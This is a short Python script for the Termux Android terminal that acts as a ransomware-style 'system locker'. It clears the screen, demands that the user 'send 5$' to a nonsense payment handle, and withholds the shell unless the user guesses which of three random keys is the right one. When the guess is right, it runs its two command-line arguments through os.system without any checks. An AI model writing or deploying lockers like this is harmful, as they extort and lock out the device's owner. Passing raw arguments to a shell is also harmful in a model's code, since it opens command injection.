#!/data/data/com.termux/files/usr/bin/env python
import string
import random
import getpass
import hashlib
import sys
import os
os.system('clear')
print('************ SYSTEM LOCKER (%ROOT%) *********')
print('************ You loaded locker :D *********')
print('************ If you Lucky enter password *******')
print('************ Or send 5$ here => hwwisbjsjehshejsbs ********')
print('************ Waitt..... ***********')
print('I am here.')
def id_generator(size, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
core = random.randint(1,3)
one = id_generator(5)
two = id_generator(6)
three = id_generator(7)
list = [one,two,three]
print(f"Choose keys:{one},{two},{three}")
password = getpass.getpass()
if password == one and core !=1 or password == two and core != 2 or password == three and core != 3 or password not in list:
    print("Invalid password")
    os.system("exit")
else:
    prefix = "/data/data/com.termux/files/usr"
    home = "/data/data/com.termux/files/home"
    motd = False
    hush = False

    os.system("clear")

    try:
        open(prefix + "/etc/motd")
        motd = True
    except:
        motd = False

    try:
        open(home + "/.hushlogin")
        hush = True
    except:
        hush = False

    if motd and not hush:
        print(open(prefix + "/etc/motd").read())
    
    os.system(sys.argv[1] + " " + sys.argv[2])
